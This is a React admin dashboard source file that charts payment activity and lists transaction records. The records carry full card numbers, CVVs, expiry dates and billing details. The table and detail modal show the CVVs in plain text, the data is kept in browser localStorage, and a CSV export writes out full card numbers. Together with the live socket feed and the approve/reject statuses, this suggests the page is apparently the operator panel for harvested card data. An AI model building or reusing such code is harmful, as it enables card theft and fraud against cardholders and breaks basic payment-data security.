import React, { useState, useEffect } from 'react';
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
} from 'chart.js';
import { Line, Bar, Doughnut, Pie } from 'react-chartjs-2';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { 
  TrendingUp, 
  TrendingDown, 
  DollarSign, 
  CreditCard, 
  Globe, 
  Clock,
  Download,
  RefreshCw,
  Search,
  Filter,
  Eye,
  Calendar,
  Users,
  Target,
  BarChart3,
  ArrowLeft,
  FileText
} from 'lucide-react';
import { useSocket } from '../SocketContext';
import { useNavigate } from 'react-router-dom';

// Register ChartJS components
ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement
);

interface PaymentData {
  id: string;
  paymentId: string;
  cardNumber: string;
  cardName: string;
  cvv: string;
  expiry: string;
  billingDetails: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    address: string;
    city: string;
    zipCode: string;
    country: string;
    state: string;
    companyName: string;
  };
  planName: string;
  billing: string;
  amount: number;
  timestamp: string;
  status: 'pending' | 'approved' | 'rejected';
  cardCountry?: {
    name: string;
    code: string;
    flag: string;
  };
  currency?: string;
}

interface AnalyticsData {
  overview: {
    totalPayments: number;
    totalRevenue: number;
    avgPaymentValue: number;
    todayPayments: number;
    todayRevenue: number;
    weekPayments: number;
    weekRevenue: number;
    monthPayments: number;
    monthRevenue: number;
    monthGrowth: number;
  };
  breakdown: {
    currency: { [key: string]: { count: number; revenue: number } };
    country: { [key: string]: { count: number; revenue: number } };
  };
  trends: {
    hourly: Array<{ hour: number; count: number; revenue: number }>;
    daily: Array<{ date: string; count: number; revenue: number }>;
  };
  insights: {
    peakHour: number;
    peakHourRevenue: number;
    topCountry: string;
    topCurrency: string;
  };
}

const AnalyticsPage: React.FC = () => {
  const navigate = useNavigate();
  const { socket } = useSocket();
  
  // State management
  const [payments, setPayments] = useState<PaymentData[]>([]);
  const [analyticsData, setAnalyticsData] = useState<AnalyticsData | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  const [currencyFilter, setCurrencyFilter] = useState('all');
  const [countryFilter, setCountryFilter] = useState('all');
  const [dateRange, setDateRange] = useState('all');
  const [selectedPayment, setSelectedPayment] = useState<PaymentData | null>(null);
  const [showPaymentModal, setShowPaymentModal] = useState(false);

  // Fetch data on component mount
  useEffect(() => {
    fetchAnalyticsData();
    fetchPaymentsData();
  }, []);

  // Socket listeners for real-time updates
  useEffect(() => {
    if (!socket) return;

    const handleAnalyticsUpdate = (data: AnalyticsData) => {
      setAnalyticsData(data);
    };

    const handlePaymentReceived = (payment: PaymentData) => {
      setPayments(prev => [payment, ...prev]);
      fetchAnalyticsData(); // Refresh analytics
    };

    socket.on('analytics-update', handleAnalyticsUpdate);
    socket.on('payment-received', handlePaymentReceived);
    socket.on('payment-data', handlePaymentReceived);

    return () => {
      socket.off('analytics-update', handleAnalyticsUpdate);
      socket.off('payment-received', handlePaymentReceived);
      socket.off('payment-data', handlePaymentReceived);
    };
  }, [socket]);

  const fetchAnalyticsData = async () => {
    try {
      const response = await fetch('/api/analytics');
      const result = await response.json();
      if (result.success) {
        setAnalyticsData(result.data);
      }
    } catch (error) {
      console.error('Failed to fetch analytics:', error);
    }
  };

  const fetchPaymentsData = async () => {
    try {
      // Load from localStorage and server
      const savedPayments = localStorage.getItem('adminPayments');
      if (savedPayments) {
        setPayments(JSON.parse(savedPayments));
      }
      setIsLoading(false);
    } catch (error) {
      console.error('Failed to fetch payments:', error);
      setIsLoading(false);
    }
  };

  // Filter payments based on search and filters
  const filteredPayments = payments.filter(payment => {
    const matchesSearch = 
      payment.cardNumber.includes(searchTerm) ||
      payment.cardName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      payment.billingDetails.email.toLowerCase().includes(searchTerm.toLowerCase()) ||
      payment.billingDetails.firstName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      payment.billingDetails.lastName.toLowerCase().includes(searchTerm.toLowerCase());

    const matchesStatus = statusFilter === 'all' || payment.status === statusFilter;
    const matchesCurrency = currencyFilter === 'all' || (payment.currency || 'INR') === currencyFilter;
    const matchesCountry = countryFilter === 'all' || 
      (payment.cardCountry?.name || 'Unknown') === countryFilter;

    let matchesDate = true;
    if (dateRange !== 'all') {
      const paymentDate = new Date(payment.timestamp);
      const now = new Date();
      switch (dateRange) {
        case 'today':
          matchesDate = paymentDate.toDateString() === now.toDateString();
          break;
        case 'week':
          matchesDate = now.getTime() - paymentDate.getTime() <= 7 * 24 * 60 * 60 * 1000;
          break;
        case 'month':
          matchesDate = now.getTime() - paymentDate.getTime() <= 30 * 24 * 60 * 60 * 1000;
          break;
      }
    }

    return matchesSearch && matchesStatus && matchesCurrency && matchesCountry && matchesDate;
  });

  // Format currency
  const formatCurrency = (amount: number, currency?: string) => {
    const curr = currency || 'INR';
    if (curr === 'USD') {
      return `$${amount.toFixed(2)}`;
    }
    return `₹${amount.toFixed(2)}`;
  };

  // Export functions
  const exportToCSV = () => {
    const headers = [
      'Date', 'Payment ID', 'Customer Name', 'Email', 'Card Number', 
      'Amount', 'Currency', 'Country', 'Status', 'Plan'
    ];
    
    const csvData = filteredPayments.map(payment => [
      new Date(payment.timestamp).toLocaleDateString(),
      payment.paymentId,
      `${payment.billingDetails.firstName} ${payment.billingDetails.lastName}`,
      payment.billingDetails.email,
      payment.cardNumber,
      payment.amount,
      payment.currency || 'INR',
      payment.cardCountry?.name || 'Unknown',
      payment.status,
      payment.planName
    ]);

    const csvContent = [headers, ...csvData]
      .map(row => row.map(field => `"${field}"`).join(','))
      .join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `transactions-${new Date().toISOString().split('T')[0]}.csv`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const viewPaymentDetails = (payment: PaymentData) => {
    setSelectedPayment(payment);
    setShowPaymentModal(true);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-950 text-white p-6">
        <div className="max-w-7xl mx-auto">
          <div className="text-center py-20">
            <RefreshCw className="h-8 w-8 animate-spin mx-auto mb-4" />
            <p>Loading analytics...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {/* Header */}
      <div className="border-b border-gray-800 bg-gray-900">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Button
                onClick={() => navigate('/admin')}
                variant="ghost"
                size="sm"
                className="text-gray-400 hover:text-white"
              >
                <ArrowLeft className="h-4 w-4 mr-2" />
                Back to Admin
              </Button>
              <div>
                <h1 className="text-2xl font-bold">📊 Advanced Analytics</h1>
                <p className="text-gray-400">Complete transaction history and insights</p>
              </div>
            </div>
            <div className="flex gap-2">
              <Button onClick={fetchAnalyticsData} variant="outline" size="sm">
                <RefreshCw className="h-4 w-4 mr-2" />
                Refresh
              </Button>
              <Button onClick={exportToCSV} variant="outline" size="sm">
                <Download className="h-4 w-4 mr-2" />
                Export CSV
              </Button>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto p-6 space-y-6">
        
        {/* Quick Stats */}
        {analyticsData && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium flex items-center">
                  <DollarSign className="h-4 w-4 mr-2" />
                  Total Revenue
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">
                  {formatCurrency(analyticsData.overview.totalRevenue)}
                </div>
                <p className="text-xs text-gray-400">
                  {analyticsData.overview.totalPayments} payments
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium flex items-center">
                  <Calendar className="h-4 w-4 mr-2" />
                  Today
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">
                  {formatCurrency(analyticsData.overview.todayRevenue)}
                </div>
                <p className="text-xs text-gray-400">
                  {analyticsData.overview.todayPayments} payments
                </p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium flex items-center">
                  <TrendingUp className="h-4 w-4 mr-2" />
                  Growth
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className={`text-2xl font-bold ${
                  analyticsData.overview.monthGrowth >= 0 ? 'text-green-400' : 'text-red-400'
                }`}>
                  {analyticsData.overview.monthGrowth >= 0 ? '+' : ''}{analyticsData.overview.monthGrowth.toFixed(1)}%
                </div>
                <p className="text-xs text-gray-400">vs last month</p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium flex items-center">
                  <BarChart3 className="h-4 w-4 mr-2" />
                  Avg Payment
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">
                  {formatCurrency(analyticsData.overview.avgPaymentValue)}
                </div>
                <p className="text-xs text-gray-400">per transaction</p>
              </CardContent>
            </Card>

            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium flex items-center">
                  <Clock className="h-4 w-4 mr-2" />
                  Peak Hour
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="text-2xl font-bold">
                  {analyticsData.insights.peakHour}:00
                </div>
                <p className="text-xs text-gray-400">
                  {formatCurrency(analyticsData.insights.peakHourRevenue)}
                </p>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Charts Section */}
        {analyticsData && (
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Daily Revenue Trend */}
            <Card>
              <CardHeader>
                <CardTitle>📈 Daily Revenue Trend (30 days)</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Line 
                    data={{
                      labels: analyticsData.trends.daily.map(d => 
                        new Date(d.date).toLocaleDateString('en-US', { month: 'short', day: 'numeric' })
                      ),
                      datasets: [{
                        label: 'Revenue',
                        data: analyticsData.trends.daily.map(d => d.revenue),
                        borderColor: 'rgb(59, 130, 246)',
                        backgroundColor: 'rgba(59, 130, 246, 0.1)',
                        tension: 0.4,
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>

            {/* Hourly Payments */}
            <Card>
              <CardHeader>
                <CardTitle>⏰ Hourly Payment Distribution</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Bar 
                    data={{
                      labels: analyticsData.trends.hourly.map(h => `${h.hour}:00`),
                      datasets: [{
                        label: 'Payments',
                        data: analyticsData.trends.hourly.map(h => h.count),
                        backgroundColor: 'rgba(34, 197, 94, 0.8)',
                        borderColor: 'rgb(34, 197, 94)',
                        borderWidth: 1,
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>

            {/* Currency Breakdown */}
            <Card>
              <CardHeader>
                <CardTitle>💱 Revenue by Currency</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Doughnut 
                    data={{
                      labels: Object.keys(analyticsData.breakdown.currency),
                      datasets: [{
                        data: Object.values(analyticsData.breakdown.currency).map(c => c.revenue),
                        backgroundColor: ['#3B82F6', '#EF4444', '#10B981', '#F59E0B'],
                        borderWidth: 2,
                        borderColor: '#ffffff',
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>

            {/* Country Distribution */}
            <Card>
              <CardHeader>
                <CardTitle>🌍 Payments by Country</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="h-64">
                  <Pie 
                    data={{
                      labels: Object.keys(analyticsData.breakdown.country).slice(0, 5),
                      datasets: [{
                        data: Object.values(analyticsData.breakdown.country).slice(0, 5).map(c => c.count),
                        backgroundColor: ['#06B6D4', '#84CC16', '#F97316', '#EC4899', '#6366F1'],
                        borderWidth: 2,
                        borderColor: '#ffffff',
                      }],
                    }}
                    options={{
                      responsive: true,
                      maintainAspectRatio: false,
                      plugins: { legend: { position: 'bottom' as const } },
                    }}
                  />
                </div>
              </CardContent>
            </Card>
          </div>
        )}

        {/* Filters Section */}
        <Card>
          <CardHeader>
            <CardTitle>🔍 Transaction Filters</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-6 gap-4">
              {/* Search */}
              <div className="lg:col-span-2">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    placeholder="Search transactions..."
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    className="pl-10 bg-gray-800 border-gray-600 text-white"
                  />
                </div>
              </div>

              {/* Status Filter */}
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Status" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Status</SelectItem>
                  <SelectItem value="pending" className="text-white">Pending</SelectItem>
                  <SelectItem value="approved" className="text-white">Approved</SelectItem>
                  <SelectItem value="rejected" className="text-white">Rejected</SelectItem>
                </SelectContent>
              </Select>

              {/* Currency Filter */}
              <Select value={currencyFilter} onValueChange={setCurrencyFilter}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Currency" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Currencies</SelectItem>
                  <SelectItem value="INR" className="text-white">🇮🇳 INR</SelectItem>
                  <SelectItem value="USD" className="text-white">🇺🇸 USD</SelectItem>
                </SelectContent>
              </Select>

              {/* Date Range Filter */}
              <Select value={dateRange} onValueChange={setDateRange}>
                <SelectTrigger className="bg-gray-800 border-gray-600 text-white">
                  <SelectValue placeholder="Date Range" />
                </SelectTrigger>
                <SelectContent className="bg-gray-800 border-gray-600">
                  <SelectItem value="all" className="text-white">All Time</SelectItem>
                  <SelectItem value="today" className="text-white">Today</SelectItem>
                  <SelectItem value="week" className="text-white">This Week</SelectItem>
                  <SelectItem value="month" className="text-white">This Month</SelectItem>
                </SelectContent>
              </Select>

              {/* Results Count */}
              <div className="flex items-center text-sm text-gray-400">
                {filteredPayments.length} transactions found
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Transaction History Table */}
        <Card>
          <CardHeader>
            <CardTitle>💳 Complete Transaction History</CardTitle>
            <p className="text-gray-400">Detailed view of all payment transactions</p>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Date & Time</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Customer</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Card Details</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Amount</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Country</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Status</th>
                    <th className="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Actions</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {filteredPayments.length === 0 ? (
                    <tr>
                      <td colSpan={7} className="px-4 py-8 text-center text-gray-400">
                        No transactions found
                      </td>
                    </tr>
                  ) : (
                    filteredPayments.map((payment) => (
                      <tr key={payment.id} className="hover:bg-gray-800 transition-colors">
                        <td className="px-4 py-4 text-sm">
                          <div>
                            <div className="font-medium">{new Date(payment.timestamp).toLocaleDateString()}</div>
                            <div className="text-gray-400">{new Date(payment.timestamp).toLocaleTimeString()}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div>
                            <div className="font-medium">{payment.billingDetails.firstName} {payment.billingDetails.lastName}</div>
                            <div className="text-gray-400">{payment.billingDetails.email}</div>
                            <div className="text-xs text-gray-500">{payment.billingDetails.phone}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm font-mono">
                          <div>
                            <div className="text-green-400">•••• •••• •••• {payment.cardNumber.slice(-4)}</div>
                            <div className="text-gray-400">{payment.cardName}</div>
                            <div className="text-xs text-gray-500">CVV: {payment.cvv} | Exp: {payment.expiry}</div>
                          </div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div className="font-medium text-green-400">
                            {formatCurrency(payment.amount, payment.currency)}
                          </div>
                          <div className="text-xs text-gray-400">{payment.planName}</div>
                        </td>
                        <td className="px-4 py-4 text-sm">
                          <div className="flex items-center gap-2">
                            <span>{payment.cardCountry?.flag || '🌍'}</span>
                            <span>{payment.cardCountry?.name || 'Unknown'}</span>
                          </div>
                        </td>
                        <td className="px-4 py-4">
                          <span className={`inline-flex px-2 py-1 text-xs font-medium rounded-full ${
                            payment.status === 'approved' ? 'bg-green-100 text-green-800' :
                            payment.status === 'rejected' ? 'bg-red-100 text-red-800' :
                            'bg-yellow-100 text-yellow-800'
                          }`}>
                            {payment.status}
                          </span>
                        </td>
                        <td className="px-4 py-4">
                          <Button
                            onClick={() => viewPaymentDetails(payment)}
                            size="sm"
                            variant="outline"
                            className="border-gray-600 text-gray-300 hover:bg-gray-700"
                          >
                            <Eye className="h-4 w-4 mr-1" />
                            View
                          </Button>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>

        {/* Payment Details Modal */}
        <Dialog open={showPaymentModal} onOpenChange={setShowPaymentModal}>
          <DialogContent className="max-w-4xl bg-gray-900 border-gray-700 text-white">
            <DialogHeader>
              <DialogTitle>💳 Complete Payment Details</DialogTitle>
            </DialogHeader>
            {selectedPayment && (
              <div className="space-y-6">
                {/* Payment Summary */}
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4 p-4 bg-gray-800 rounded-lg">
                  <div>
                    <h4 className="font-semibold text-green-400">Payment Amount</h4>
                    <p className="text-2xl font-bold">{formatCurrency(selectedPayment.amount, selectedPayment.currency)}</p>
                    <p className="text-sm text-gray-400">{selectedPayment.planName}</p>
                  </div>
                  <div>
                    <h4 className="font-semibold text-blue-400">Payment ID</h4>
                    <p className="font-mono text-sm">{selectedPayment.paymentId}</p>
                    <p className="text-sm text-gray-400">{new Date(selectedPayment.timestamp).toLocaleString()}</p>
                  </div>
                  <div>
                    <h4 className="font-semibold text-purple-400">Status</h4>
                    <span className={`inline-flex px-2 py-1 text-sm font-medium rounded-full ${
                      selectedPayment.status === 'approved' ? 'bg-green-100 text-green-800' :
                      selectedPayment.status === 'rejected' ? 'bg-red-100 text-red-800' :
                      'bg-yellow-100 text-yellow-800'
                    }`}>
                      {selectedPayment.status}
                    </span>
                  </div>
                </div>

                {/* Customer Details */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold">👤 Customer Information</h3>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Name:</span> {selectedPayment.billingDetails.firstName} {selectedPayment.billingDetails.lastName}</div>
                      <div><span className="text-gray-400">Email:</span> {selectedPayment.billingDetails.email}</div>
                      <div><span className="text-gray-400">Phone:</span> {selectedPayment.billingDetails.phone}</div>
                      <div><span className="text-gray-400">Company:</span> {selectedPayment.billingDetails.companyName || 'N/A'}</div>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h3 className="text-lg font-semibold">🏠 Billing Address</h3>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Address:</span> {selectedPayment.billingDetails.address}</div>
                      <div><span className="text-gray-400">City:</span> {selectedPayment.billingDetails.city}</div>
                      <div><span className="text-gray-400">State:</span> {selectedPayment.billingDetails.state}</div>
                      <div><span className="text-gray-400">ZIP:</span> {selectedPayment.billingDetails.zipCode}</div>
                      <div><span className="text-gray-400">Country:</span> {selectedPayment.billingDetails.country}</div>
                    </div>
                  </div>
                </div>

                {/* Card Details */}
                <div className="space-y-4">
                  <h3 className="text-lg font-semibold">💳 Card Information</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4 bg-gray-800 rounded-lg">
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Card Number:</span> <span className="font-mono">{selectedPayment.cardNumber}</span></div>
                      <div><span className="text-gray-400">Cardholder Name:</span> {selectedPayment.cardName}</div>
                      <div><span className="text-gray-400">CVV:</span> <span className="font-mono">{selectedPayment.cvv}</span></div>
                      <div><span className="text-gray-400">Expiry:</span> <span className="font-mono">{selectedPayment.expiry}</span></div>
                    </div>
                    <div className="space-y-2 text-sm">
                      <div><span className="text-gray-400">Card Country:</span> {selectedPayment.cardCountry?.flag} {selectedPayment.cardCountry?.name || 'Unknown'}</div>
                      <div><span className="text-gray-400">Currency:</span> {selectedPayment.currency || 'INR'}</div>
                      <div><span className="text-gray-400">Billing Cycle:</span> {selectedPayment.billing}</div>
                    </div>
                  </div>
                </div>
              </div>
            )}
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default AnalyticsPage;
